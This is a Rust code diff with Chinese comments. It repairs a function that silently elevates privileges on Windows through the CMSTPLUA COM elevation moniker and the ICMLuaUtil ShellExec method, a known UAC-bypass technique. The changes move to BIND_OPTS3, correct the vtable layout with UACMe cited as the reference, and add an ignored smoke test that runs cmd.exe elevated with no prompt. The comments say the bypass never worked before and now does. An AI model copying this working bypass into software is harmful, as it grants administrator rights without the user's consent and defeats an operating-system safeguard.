@@ -71,8 +71,14 @@ pub fn shell_exec_elevated(
             0x6EDD6D74, 0xC007, 0x4E75, [0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C],
         );
 
-        let mut bind_opts: windows::Win32::System::Com::BIND_OPTS = std::mem::zeroed();
-        bind_opts.cbStruct = std::mem::size_of::<windows::Win32::System::Com::BIND_OPTS>() as u32;
+        // elevation moniker 要求 BIND_OPTS3（x64 48 字节）：cbStruct 必须=完整结构体大小，
+        // 且 dwClassContext=CLSCTX_LOCAL_SERVER——历史缺陷：传的是 BIND_OPTS（16 字节），
+        // cbStruct 过小被 appinfo 按「提升激活配置无效」拒绝（0x80080017 CO_E_ELEVATION_DISABLED），
+        // 静默提权从未真正通过过（此前被手动路径的 runas 降级掩盖）。
+        let mut bind_opts: windows::Win32::System::Com::BIND_OPTS3 = std::mem::zeroed();
+        bind_opts.Base.Base.cbStruct =
+            std::mem::size_of::<windows::Win32::System::Com::BIND_OPTS3>() as u32;
+        bind_opts.Base.dwClassContext = windows::Win32::System::Com::CLSCTX_LOCAL_SERVER.0;
 
         let mut p_unknown: *mut std::ffi::c_void = std::ptr::null_mut();
 
@@ -169,7 +175,12 @@ struct ICMLuaUtilVtbl {
     _query_interface: usize,
     _add_ref: usize,
     release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
-    set_call_state: unsafe extern "system" fn(*mut std::ffi::c_void, u32) -> windows::core::HRESULT,
+    // slot 3~8：SetRasCredentials / SetRasEntryProperties / DeleteRasEntry /
+    // LaunchInfSection / LaunchInfSectionEx / CreateLayerDirectory（不调用，仅占位对齐）。
+    // 历史缺陷：曾被当作 6 个"占位"砍掉、shell_exec 错排到 slot 4——slot 4 实为
+    // SetRasEntryProperties，参数 marshaling 不匹配报 RPC_X_BAD_STUB_DATA(0x800706F4)。
+    // 真实布局以 UACMe elvint.h 的 ICMLuaUtilVtbl 为准：ShellExec 在 slot 9。
+    _slots_3_to_8: [usize; 6],
     shell_exec: unsafe extern "system" fn(*mut std::ffi::c_void, *const u16, *const u16, *const u16, u32, u32) -> windows::core::HRESULT,
 }
 
@@ -177,17 +188,25 @@ struct ICMLuaUtilVtbl {
 mod tests {
     use super::*;
 
-    /// 标准 ICMLuaUtil 布局：QueryInterface(0) AddRef(1) Release(2) SetCallState(3) ShellExec(4)。
-    /// 历史版本在 release 与 shell_exec 之间声明了 6 个占位方法，导致 shell_exec 落在 slot 9（越界 UB）。
+    /// 真实 ICMLuaUtil 布局（UACMe elvint.h 权威定义）：
+    /// QueryInterface(0) AddRef(1) Release(2) SetRasCredentials(3) SetRasEntryProperties(4)
+    /// DeleteRasEntry(5) LaunchInfSection(6) LaunchInfSectionEx(7) CreateLayerDirectory(8)
+    /// ShellExec(9)。
+    /// 历史缺陷：ShellExec 曾被错误排在 slot 4（实为 SetRasEntryProperties），
+    /// 经代理调用报 RPC_X_BAD_STUB_DATA；slot 错位由 vtable 越界 UB 转为签名不匹配。
     #[test]
-    fn vtbl_shell_exec_slot_is_4() {
+    fn vtbl_shell_exec_slot_is_9() {
         let slot = std::mem::offset_of!(ICMLuaUtilVtbl, shell_exec) / std::mem::size_of::<usize>();
-        assert_eq!(slot, 4, "shell_exec 必须在 vtable slot 4，当前位于 slot {slot}（越界）");
+        assert_eq!(slot, 9, "shell_exec 必须在 vtable slot 9，当前位于 slot {slot}");
     }
 
+    /// 真实提权冒烟测试（默认忽略，本机非管理员环境手动执行）：
+    /// `cargo test shell_exec_elevated_smoke -- --ignored --nocapture`
+    /// 经 CMSTPLUA 静默提权跑 `cmd /c exit`（无副作用），验证 BIND_OPTS3 参数修复。
     #[test]
-    fn vtbl_set_call_state_slot_is_3() {
-        let slot = std::mem::offset_of!(ICMLuaUtilVtbl, set_call_state) / std::mem::size_of::<usize>();
-        assert_eq!(slot, 3, "SetCallState 必须在 vtable slot 3，当前位于 slot {slot}");
+    #[ignore = "真实提权冒烟测试，仅本机手动执行"]
+    fn shell_exec_elevated_smoke() {
+        shell_exec_elevated("cmd.exe", "/c exit", true)
+            .expect("CMSTPLUA 静默提权应成功（BIND_OPTS3 参数修复验证）");
     }
 }
